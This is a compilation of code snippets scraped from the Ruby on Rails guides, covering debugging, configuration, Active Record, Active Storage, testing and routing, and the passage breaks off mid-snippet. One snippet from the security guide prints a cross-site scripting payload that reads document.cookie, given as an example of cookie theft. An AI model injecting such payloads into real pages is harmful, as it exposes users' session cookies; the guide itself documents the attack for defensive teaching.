https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\n[20, 29] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb\n    20|   end\n    21|\n    22|   # POST /posts or /posts.json\n    23|   def create\n    24|     @post = Post.new(post_params)\n=>  25|     debugger\n    26|\n    27|     respond_to do |format|\n    28|       if @post.save\n    29|         format.html { redirect_to @post, notice: \"Post was successfully created.\" }\n=>#0    PostsController#create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:25\n  #1    ActionController::BasicImplicitRender#send_action(method=\"create\", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6\n  # and 72 frames (use `bt' command for all frames)\n(rdbg) b 28    # break command\n#0  BP - Line  /Users/st0012/projects/rails-guide-example/app/controllers/posts_controller.rb:28 (line)\n```\n\nLANGUAGE: ruby\nCODE:\n```\n(rdbg) c    # continue command\n[23, 32] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb\n    23|   def create\n    24|     @post = Post.new(post_params)\n    25|     debugger\n    26|\n    27|     respond_to do |format|\n=>  28|       if @post.save\n    29|         format.html { redirect_to @post, notice: \"Post was successfully created.\" }\n    30|         format.json { render :show, status: :created, location: @post }\n    31|       else\n    32|         format.html { render :new, status: :unprocessable_entity }\n=>#0    block {|format=#<ActionController::MimeResponds::Collec...|} in create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:28\n  #1    ActionController::MimeResponds#respond_to(mimes=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/mime_responds.rb:205\n  # and 74 frames (use `bt' command for all frames)\n\nStop by #0  BP - Line  /Users/st0012/projects/rails-guide-example/app/controllers/posts_controller.rb:28 (line)\n```\n\n----------------------------------------\n\nTITLE: Setting queue name prefix in application.rb\nDESCRIPTION: This snippet shows how to set a global queue name prefix for all ActiveJob jobs using `config.active_job.queue_name_prefix` in `application.rb`. This will prefix all queue names with the Rails environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nmodule YourApp\n  class Application < Rails::Application\n    config.active_job.queue_name_prefix = Rails.env\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Callback Chain Behavior for Rails 5.0 Upgrade\nDESCRIPTION: Configuration to opt into the new callback chain behavior in Rails 5.0 where returning false doesn't halt the chain. This helps with transitioning to the new throw(:abort) pattern.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport.halt_callback_chains_on_return_false = false\n```\n\n----------------------------------------\n\nTITLE: Cleaning Up Test Files in Rails System Tests\nDESCRIPTION: This Ruby code shows how to clean up files created during system tests by implementing an after_teardown callback in the ApplicationSystemTestCase.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationSystemTestCase < ActionDispatch::SystemTestCase\n  # ...\n  def after_teardown\n    super\n    FileUtils.rm_rf(ActiveStorage::Blob.service.root)\n  end\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Object Persistence Demo in Rails Console\nDESCRIPTION: Demonstrates object persistence methods and states using the Rails console, including new_record? and persisted? checks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_3\n\nLANGUAGE: irb\nCODE:\n```\nirb> p = Person.new(name: \"Jane Doe\")\n=> #<Person id: nil, name: \"Jane Doe\", created_at: nil, updated_at: nil>\n\nirb> p.new_record?\n=> true\n\nirb> p.persisted?\n=> false\n\nirb> p.save\n=> true\n\nirb> p.new_record?\n=> false\n\nirb> p.persisted?\n=> true\n```\n\n----------------------------------------\n\nTITLE: Asserting the Presence of an HTML Element\nDESCRIPTION: This code demonstrates how to use `assert_dom` to verify the presence and content of an HTML element in a view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_79\n\nLANGUAGE: ruby\nCODE:\n```\nassert_dom \"title\", \"Welcome to the Rails Testing Guide\"\n```\n\n----------------------------------------\n\nTITLE: Rails Schema Definition with Version in Ruby\nDESCRIPTION: This Ruby code shows how the Rails schema file includes the framework version when defining the database schema, which is a new feature in Rails 7.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Schema[6.1].define(version: 2022_01_28_123512) do\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Regular Expression for Integer Numericality Validation in Ruby\nDESCRIPTION: This regular expression is used internally by the `numericality` validator in Rails when the `:only_integer` option is set to true. It checks if a string represents an integer, optionally prefixed with a plus or minus sign.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\n/\\A[+-]?\\d+\\z/\n```\n\n----------------------------------------\n\nTITLE: Performing Server Startup Actions in ServerCommand (Ruby)\nDESCRIPTION: This `perform` method within the `Rails::Command::ServerCommand` class orchestrates the server startup sequence triggered by `bin/rails server`. It sets the application directory, prepares for potential restarts, creates and configures a `Rails::Server` instance using `server_options`, requires the application code (`config/application.rb` via `APP_PATH`), changes the current directory to the application root, and finally starts the server process via `server.start` if it's determined to be serveable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rails\n  module Command\n    class ServerCommand < Base # :nodoc:\n      def perform\n        set_application_directory!\n        prepare_restart\n\n        Rails::Server.new(server_options).tap do |server|\n          # Require application after server sets environment to propagate\n          # the --environment option.\n          require APP_PATH\n          Dir.chdir(Rails.application.root)\n\n          if server.serveable?\n            print_boot_information(server.server, server.served_url)\n            after_stop_callback = -> { say \"Exiting\" unless options[:daemon] }\n            server.start(after_stop_callback)\n          else\n            say rack_server_suggestion(options[:using])\n          end\n        end\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Enabling Zeitwerk Autoloader Logging - Ruby\nDESCRIPTION: Activates verbose tracing for Zeitwerk autoloaders in a Rails application's configuration, making their internal activity visible in standard output. This line should be placed in 'config/application.rb' after framework defaults have been loaded. No external dependencies are required beyond Rails itself.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nRails.autoloaders.log!\n\n```\n\n----------------------------------------\n\nTITLE: Configuring X-Sendfile Header in Ruby on Rails\nDESCRIPTION: Sets the server-specific X-Sendfile header using the config.action_dispatch.x_sendfile_header option in Rails configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.x_sendfile_header\n```\n\n----------------------------------------\n\nTITLE: Accessing Rails Console in Production via Kamal\nDESCRIPTION: This command opens a Rails console in the production environment using Kamal, allowing for direct interaction with the production database and application code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_135\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/kamal console\n```\n\n----------------------------------------\n\nTITLE: Filtering Errors by Class in Rails Error Handling\nDESCRIPTION: Shows how to filter errors by class when using Rails.error.handle. Only errors of the specified class (and its descendants) will be captured and reported.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nRails.error.handle(IOError) do\n  1 + \"1\" # raises TypeError\nend\n1 + 1 # TypeErrors are not IOErrors, so this will *not* be executed\n```\n\n----------------------------------------\n\nTITLE: Cookie Theft via XSS\nDESCRIPTION: Examples of XSS attacks that attempt to steal user cookies through JavaScript.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_40\n\nLANGUAGE: html\nCODE:\n```\n<script>document.write(document.cookie);</script>\n```\n\n----------------------------------------\n\nTITLE: Creating and Saving a Record\nDESCRIPTION: This command creates a new instance of the `Product` model with the specified attributes and immediately saves it to the database in a single step. It sets the `name` attribute to 'Pants'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_15\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.create(name: \"Pants\")\n```\n\n----------------------------------------\n\nTITLE: Interactive Console Example Showing distinct Option Behavior\nDESCRIPTION: Demonstrates in an IRB console session how using the distinct option prevents duplicate records in the articles collection, even though multiple join records (readings) exist.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_131\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.create(name: 'Honda')\nirb> article = Article.create(name: 'a1')\nirb> person.articles << article\nirb> person.articles << article\nirb> person.articles.to_a\n=> [#<Article id: 7, name: \"a1\">]\nirb> Reading.all.to_a\n=> [#<Reading id: 16, person_id: 7, article_id: 7>, #<Reading id: 17, person_id: 7, article_id: 7>]\n```\n\n----------------------------------------\n\nTITLE: Calculating Months Ago and Since in Ruby\nDESCRIPTION: The `months_ago` and `months_since` methods calculate dates in the past or future by a specified number of months. They function similarly to `years_ago` and `years_since`, adjusting the day to the last day of the month if the target date is invalid.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_150\n\nLANGUAGE: ruby\nCODE:\n```\nDate.new(2010, 4, 30).months_ago(2)   # => Sun, 28 Feb 2010\nDate.new(2010, 4, 30).months_since(2) # => Wed, 30 Jun 2010\n```\n\nLANGUAGE: ruby\nCODE:\n```\nDate.new(2010, 4, 30).months_ago(2)    # => Sun, 28 Feb 2010\nDate.new(2009, 12, 31).months_since(2) # => Sun, 28 Feb 2010\n```\n\n----------------------------------------\n\nTITLE: HTML output of date_select helper\nDESCRIPTION: This HTML code demonstrates the output of the `date_select` helper, generating three select boxes for year, month, and day, with the values from `@person.birth_date` pre-selected.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_43\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"person[birth_date(1i)]\" id=\"person_birth_date_1i\">\n  <option value=\"1990\">1990</option>\n  <option value=\"1991\">1991</option>\n  <option value=\"1992\">1992</option>\n  <option value=\"1993\">1993</option>\n  <option value=\"1994\">1994</option>\n  <option value=\"1995\" selected=\"selected\">1995</option>\n  <option value=\"1996\">1996</option>\n  <option value=\"1997\">1997</option>\n  <option value=\"1998\">1998</option>\n  <option value=\"1999\">1999</option>\n  <option value=\"2000\">2000</option>\n</select>\n<select name=\"person[birth_date(2i)]\" id=\"person_birth_date_2i\">\n  <option value=\"1\">January</option>\n  <option value=\"2\">February</option>\n  <option value=\"3\">March</option>\n  <option value=\"4\">April</option>\n  <option value=\"5\">May</option>\n  <option value=\"6\">June</option>\n  <option value=\"7\">July</option>\n  <option value=\"8\">August</option>\n  <option value=\"9\">September</option>\n  <option value=\"10\">October</option>\n  <option value=\"11\">November</option>\n  <option value=\"12\" selected=\"selected\">December</option>\n</select>\n<select name=\"person[birth_date(3i)]\" id=\"person_birth_date_3i\">\n  <option value=\"1\">1</option>\n  ...\n  <option value=\"21\" selected=\"selected\">21</option>\n  ...\n  <option value=\"31\">31</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Constantizing Strings\nDESCRIPTION: Shows the `constantize` method, which resolves a constant name represented as a string. If the constant doesn't exist or is invalid, it raises a `NameError`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_82\n\nLANGUAGE: ruby\nCODE:\n```\n\"Integer\".constantize # => Integer\n\nmodule M\n  X = 1\nend\n\"M::X\".constantize # => 1\n```\n\n----------------------------------------\n\nTITLE: Styling the Application with CSS\nDESCRIPTION: This CSS snippet defines styles for the application, including the body, navigation, notices, and product sections. It sets the font family to sans-serif, adds padding and margins, and configures flexbox layouts for the navigation and product sections. These styles provide a basic visual structure for the application's user interface.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_119\n\nLANGUAGE: css\nCODE:\n```\nbody {\n  font-family: Arial, Helvetica, sans-serif;\n  padding: 1rem;\n}\n\nnav {\n  justify-content: flex-end;\n  display: flex;\n  font-size: 0.875em;\n  gap: 0.5rem;\n  max-width: 1024px;\n  margin: 0 auto;\n  padding: 1rem;\n}\n\nnav a {\n  display: inline-block;\n}\n\nmain {\n  max-width: 1024px;\n  margin: 0 auto;\n}\n\n.notice {\n  color: green;\n}\n\nsection.product {\n  display: flex;\n  gap: 1rem;\n  flex-direction: row;\n}\n\nsection.product img {\n  border-radius: 8px;\n  flex-basis: 50%;\n  max-width: 50%;\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to Time with Timezone Options in Ruby\nDESCRIPTION: Demonstrates converting a string to a Time object with specific timezone settings, using the `:utc` and `:local` options. The `to_time` method accepts these options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_93\n\nLANGUAGE: ruby\nCODE:\n```\n\"2010-07-27 23:42:00\".to_time(:utc)   # => 2010-07-27 23:42:00 UTC\n\"2010-07-27 23:42:00\".to_time(:local) # => 2010-07-27 23:42:00 +0200\n```\n\n----------------------------------------\n\nTITLE: Creating an Initializer for Engine Configuration\nDESCRIPTION: Ruby code for an initializer in the host application that configures the author_class setting for the Blorgh engine.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nBlorgh.author_class = \"User\"\n```\n\n----------------------------------------\n\nTITLE: Builder XML with Block Example (Ruby)\nDESCRIPTION: This Ruby code demonstrates how to use blocks with the Builder library to create nested XML elements. It displays a person's name and bio within a `div` element.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_8\n\nLANGUAGE: Ruby\nCODE:\n```\nxml.div {\n  xml.h1(@person.name)\n  xml.p(@person.bio)\n}\n```\n\n----------------------------------------\n\nTITLE: Editing the Yaffle Gemspec - RubyGems Specification - Ruby\nDESCRIPTION: This code snippet shows how to fill out key metadata fields in the generated 'yaffle.gemspec' file. Setting 'homepage', 'summary', 'description', and URIs ensures the gem is well-described for publishing and distribution. No external dependencies are needed beyond the gem specification file itself.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nspec.homepage    = \"http://example.com\"\nspec.summary     = \"Summary of Yaffle.\"\nspec.description = \"Description of Yaffle.\"\n\n...\n\nspec.metadata[\"source_code_uri\"] = \"http://example.com\"\nspec.metadata[\"changelog_uri\"] = \"http://example.com\"\n```\n\n----------------------------------------\n\nTITLE: Running Tests for a Specific File in Bash (Action View)\nDESCRIPTION: Executes all tests contained within a single specified test file (`test/template/form_helper_test.rb`) within the Action View component.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\n$ cd actionview\n$ bin/test test/template/form_helper_test.rb\n```\n\n----------------------------------------\n\nTITLE: Using javascript_tag Helper in Rails\nDESCRIPTION: The javascript_tag helper wraps provided JavaScript code in a script tag. It supports options to control the behavior of the script tag and can be used with either direct content passing or with a block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\njavascript_tag(\"alert('All is good')\", type: \"application/javascript\")\n```\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"application/javascript\">\n//<![CDATA[\nalert('All is good')\n//]]>\n</script>\n```\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= javascript_tag type: \"application/javascript\" do %>\n  alert(\"Welcome to my app!\")\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Updating Gemfile for Rails 3.2 Upgrade\nDESCRIPTION: This snippet shows the necessary changes to the Gemfile when upgrading to Rails 3.2. It includes the updated Rails version and asset-related gems.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_100\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"rails\", \"3.2.21\"\n\ngroup :assets do\n  gem \"sass-rails\",   \"~> 3.2.6\"\n  gem \"coffee-rails\", \"~> 3.2.2\"\n  gem \"uglifier\",     \">= 1.0.3\"\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Query after Rewriting Where Condition (SQL)\nDESCRIPTION: This SQL query shows the result of using the `rewhere` method. The query now filters for books where `out_of_print` is false (0).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_122\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE out_of_print = 0\n```\n\n----------------------------------------\n\nTITLE: Azure Storage CORS Configuration for Active Storage\nDESCRIPTION: XML configuration for Azure Storage Cross-Origin Resource Sharing (CORS) settings that allows direct uploads. This configuration includes Azure-specific headers required for the direct upload process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_69\n\nLANGUAGE: xml\nCODE:\n```\n<Cors>\n  <CorsRule>\n    <AllowedOrigins>https://www.example.com</AllowedOrigins>\n    <AllowedMethods>PUT</AllowedMethods>\n    <AllowedHeaders>Content-Type, Content-MD5, x-ms-blob-content-disposition, x-ms-blob-type</AllowedHeaders>\n    <MaxAgeInSeconds>3600</MaxAgeInSeconds>\n  </CorsRule>\n</Cors>\n```\n\n----------------------------------------\n\nTITLE: Using Storage Proxy for Specific Attachments in Rails Views\nDESCRIPTION: Shows how to explicitly proxy specific attachments using the rails_storage_proxy_path helper in a view template. This displays an image through the proxy server rather than via redirect.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_46\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag rails_storage_proxy_path(@user.avatar) %>\n```\n\n----------------------------------------\n\nTITLE: Running Active Record Tests for PostgreSQL in Bash\nDESCRIPTION: Executes the Active Record test suite specifically using the PostgreSQL adapter via the `test:postgresql` Rake task. Requires the PostgreSQL test database to be built first.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_27\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake test:postgresql\n```\n\n----------------------------------------\n\nTITLE: Pessimistic Locking SQL Example (SQL)\nDESCRIPTION: This SQL snippet shows the SQL generated for pessimistic locking using a MySQL backend.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_134\n\nLANGUAGE: sql\nCODE:\n```\nSQL (0.2ms)   BEGIN\nBook Load (0.3ms)   SELECT * FROM books LIMIT 1 FOR UPDATE\nBook Update (0.4ms)   UPDATE books SET updated_at = '2009-02-07 18:05:56', title = 'Algorithms, second edition' WHERE id = 1\nSQL (0.8ms)   COMMIT\n```\n\n----------------------------------------\n\nTITLE: Storing Translation Dictionaries with YAML - YAML\nDESCRIPTION: Provides a minimal example of defining translation strings in a YAML file for use with Rails I18n. Shows how a top-level locale key maps specific message keys to their string values. No prerequisites outside a standard Rails application—these files are expected in config/locales/ or similar. Inputs: YAML file. Outputs: Hash available for Rails lookups when translating strings in code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nen:\n  hello: \"Hello world\"\n```\n\n----------------------------------------\n\nTITLE: Running Migrations in Host Application\nDESCRIPTION: Command to run pending migrations in the host application, including the newly copied engine migrations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_43\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Configuring Development Environment for Rails 3.1\nDESCRIPTION: Required changes to development.rb for Rails 3.1 compatibility, including removal of RJS settings and addition of asset pipeline configuration for the development environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# Do not compress assets\nconfig.assets.compress = false\n\n# Expands the lines which load the assets\nconfig.assets.debug = true\n```\n\n----------------------------------------\n\nTITLE: Running Tests with Line Number - Rails\nDESCRIPTION: This command demonstrates how to run a specific test at a particular line number within a test file using the Rails test runner.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_19\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test test/models/article_test.rb:6 # run specific test and line\n```\n\n----------------------------------------\n\nTITLE: Installing importmap-rails in Ruby\nDESCRIPTION: Commands to add and install the importmap-rails gem in a Rails application. This enables the use of import maps for managing JavaScript dependencies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle add importmap-rails\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails importmap:install\n```\n\n----------------------------------------\n\nTITLE: English Translations in YAML\nDESCRIPTION: YAML configuration file containing English translations for the internationalized strings used in the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\n# config/locales/en.yml\nen:\n  hello_world: Hello world!\n  hello_flash: Hello flash!\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Limit in Rails\nDESCRIPTION: The SQL generated by the `limit` method shows how the `LIMIT` clause is used to restrict the number of returned records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_90\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers LIMIT 5\n```\n\n----------------------------------------\n\nTITLE: Configuring Importmap for Active Storage ESM\nDESCRIPTION: Shows how to configure importmap-rails to use the ESM version of Active Storage without bundling through the asset pipeline.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\n# config/importmap.rb\npin \"@rails/activestorage\", to: \"activestorage.esm.js\"\n```\n\n----------------------------------------\n\nTITLE: Custom Exception Handling and Authorization Enforcement in Rails Controllers (Ruby)\nDESCRIPTION: This example demonstrates custom error handling for user authorization in a Rails ApplicationController and a derivative ClientsController. The ApplicationController uses rescue_from with a custom User::NotAuthorized exception, redirecting unauthorized users and showing a flash message. ClientsController defines a before_action to check authorization, raising the custom exception when access is denied. Place this code in appropriate controllers to enforce role-based access control; depends on flash messaging, redirect_back, and the current_user method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  rescue_from User::NotAuthorized, with: :user_not_authorized\n\n  private\n    def user_not_authorized\n      flash[:error] = \"You don't have access to this section.\"\n      redirect_back(fallback_location: root_path)\n    end\nend\n\nclass ClientsController < ApplicationController\n  # Check that the user has the right authorization to access clients.\n  before_action :check_authorization\n\n  def edit\n    @client = Client.find(params[:id])\n  end\n\n  private\n    # If the user is not authorized, throw the custom exception.\n    def check_authorization\n      raise User::NotAuthorized unless current_user.admin?\n    end\nend\n\n```\n\n----------------------------------------\n\nTITLE: Disabling Advisory Locks in MySQL Production (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to disable advisory locks in a MySQL or MariaDB database configuration for the production environment in Rails. Advisory locks are used to make database migrations concurrent safe; setting `advisory_locks` to `false` disables this feature.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_89\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  adapter: mysql2\n  advisory_locks: false\n```\n\n----------------------------------------\n\nTITLE: Getting Beginning and End of Day in Ruby\nDESCRIPTION: The `beginning_of_day` method returns a timestamp at the beginning of the day (00:00:00). The `end_of_day` method returns a timestamp at the end of the day (23:59:59).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_155\n\nLANGUAGE: ruby\nCODE:\n```\ndate = Date.new(2010, 6, 7)\ndate.beginning_of_day # => Mon Jun 07 00:00:00 +0200 2010\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndate = Date.new(2010, 6, 7)\ndate.end_of_day # => Mon Jun 07 23:59:59 +0200 2010\n```\n\n----------------------------------------\n\nTITLE: Configure NullStore\nDESCRIPTION: This snippet configures the Rails application to use NullStore. This is typically used in development or test environments to disable caching.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :null_store\n```\n\n----------------------------------------\n\nTITLE: Rendering a Block with a Layout\nDESCRIPTION: Demonstrates how to render a block of code within a partial layout instead of using a separate partial file. This achieves the same output as rendering a partial with a layout.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_45\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/articles/show.html.erb %>\n<%= render(layout: 'box', locals: { article: @article }) do %>\n  <div>\n    <p><%= article.body %></p>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Cherry-picking a specific Active Support Definition\nDESCRIPTION: This example demonstrates how to load a specific Active Support core extension, in this case, `Hash#with_indifferent_access`, which allows accessing hash keys as either strings or symbols.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n{ a: 1 }.with_indifferent_access[\"a\"] # => 1\n```\n\n----------------------------------------\n\nTITLE: Deleting Middleware with Exception on Absence Using delete! - Ruby\nDESCRIPTION: This Ruby snippet employs config.middleware.delete! to remove a middleware (ActionDispatch::Executor) from the stack, raising an error if the middleware is not present. Used in application.rb and useful for stricter configuration tasks. Inputs are the middleware class to delete; if absent, an exception interrupts the configuration process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\\nconfig.middleware.delete! ActionDispatch::Executor\n```\n\n----------------------------------------\n\nTITLE: Handling Reloadable Code in Rails Initializers\nDESCRIPTION: This snippet shows how to properly handle reloadable code in Rails initializers using config.to_prepare. It ensures that the code runs both on boot and after each reload.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/api_gateway_setup.rb\nRails.application.config.to_prepare do\n  ApiGateway.endpoint = \"https://example.com\" # CORRECT\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Database Management Commands in Bash\nDESCRIPTION: Available Rails commands for managing multiple databases including creation, migration, and schema management.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails --help\n...\ndb:create                          # Create the database from DATABASE_URL or config/database.yml for the ...\ndb:create:animals                  # Create animals database for current environment\ndb:create:primary                  # Create primary database for current environment\ndb:drop                            # Drop the database from DATABASE_URL or config/database.yml for the cu...\ndb:drop:animals                    # Drop animals database for current environment\ndb:drop:primary                    # Drop primary database for current environment\ndb:migrate                         # Migrate the database (options: VERSION=x, VERBOSE=false, SCOPE=blog)\ndb:migrate:animals                 # Migrate animals database for current environment\ndb:migrate:primary                 # Migrate primary database for current environment\ndb:migrate:status                  # Display status of migrations\ndb:migrate:status:animals          # Display status of migrations for animals database\ndb:migrate:status:primary          # Display status of migrations for primary database\ndb:reset                           # Drop and recreates all databases from their schema for the current environment and loads the seeds\ndb:reset:animals                   # Drop and recreates the animals database from its schema for the current environment and loads the seeds\ndb:reset:primary                   # Drop and recreates the primary database from its schema for the current environment and loads the seeds\ndb:rollback                        # Roll the schema back to the previous version (specify steps w/ STEP=n)\ndb:rollback:animals                # Rollback animals database for current environment (specify steps w/ STEP=n)\ndb:rollback:primary                # Rollback primary database for current environment (specify steps w/ STEP=n)\ndb:schema:dump                     # Create a database schema file (either db/schema.rb or db/structure.sql  ...)\ndb:schema:dump:animals             # Create a database schema file (either db/schema.rb or db/structure.sql  ...)\ndb:schema:dump:primary             # Create a db/schema.rb file that is portable against any DB supported  ...\ndb:schema:load                     # Load a database schema file (either db/schema.rb or db/structure.sql  ...)\ndb:schema:load:animals             # Load a database schema file (either db/schema.rb or db/structure.sql  ...)\ndb:schema:load:primary             # Load a database schema file (either db/schema.rb or db/structure.sql  ...)\ndb:setup                           # Create all databases, loads all schemas, and initializes with the seed data (use db:reset to also drop all databases first)\ndb:setup:animals                   # Create the animals database, loads the schema, and initializes with the seed data (use db:reset:animals to also drop the database first)\ndb:setup:primary                   # Create the primary database, loads the schema, and initializes with the seed data (use db:reset:primary to also drop the database first)\n```\n\n----------------------------------------\n\nTITLE: Defining Shallow Nested Routes in Ruby on Rails\nDESCRIPTION: Demonstrates how to use shallow route nesting in Rails to simplify deeply-nested resources. This allows routes to be defined with only enough information to uniquely identify the resource.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: Ruby\nCODE:\n```\nmap.resources :publishers, :shallow => true do |publisher|\n  publisher.resources :magazines do |magazine|\n    magazine.resources :photos\n  